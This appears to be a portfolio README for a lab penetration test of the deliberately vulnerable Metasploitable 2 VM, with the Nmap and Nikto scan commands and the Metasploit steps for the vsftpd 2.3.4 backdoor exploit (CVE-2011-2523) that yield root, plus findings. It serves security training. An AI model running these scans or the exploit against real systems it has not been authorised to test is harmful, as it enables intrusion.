## 🛡️ Metasploitable 2 – Vulnerability Assessment & Penetration Testing (VAPT)

This project demonstrates a **full penetration testing workflow** on Metasploitable 2, a deliberately vulnerable VM.  
The goal was to simulate a real-world **Vulnerability Assessment and Penetration Test (VAPT)** and produce a consultancy-style report.

---

## 🔹 Project Roadmap! [Roadmap Infographic](assets/roadmap_infographic.png)  

---

## 🔹 Steps Performed

1️⃣ Reconnaissance (Nmap)
- Scanned target IP for open ports and services
```bash
nmap -sV <target-ip> -oN nmap_scan.txt

2️⃣ Vulnerability Scanning

Nmap vulnerability scripts

nmap -sV --script vuln <target-ip> -oN vuln_results.txt


Nikto web scan

nikto -h http://<target-ip> -output nikto_results.txt

3️⃣ Exploitation (Metasploit)

Exploited vsftpd 2.3.4 backdoor (CVE-2011-2523)

msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target-ip>
run

Verified root access with:

whoami

4️⃣ Reporting

Documented findings, CVEs, and remediation

Delivered a professional consultancy-style report (PDF)


🔹 Deliverables

📄 [Full Report (PDF)](report/Metasploitable2_Pentest_Report_Final.pdf)

🖼️ [Roadmap Infographic](assets/roadmap_infographic.png)

📸 [Proof Screenshots](screenshots)

🔹 Tools Used

Kali Linux

Nmap

Nikto

Metasploit Framework

🔹 Key Findings

Critical: FTP backdoor (vsftpd 2.3.4 – CVE-2011-2523) → Remote root access

High: Outdated Apache 2.2.8 & PHP 5.2.4

Medium: Missing HTTP security headers

🔹 Author

👤 Gufran Ahmed
🌐 [LinkedIn](https://www.linkedin.com/in/gufran-uh/)
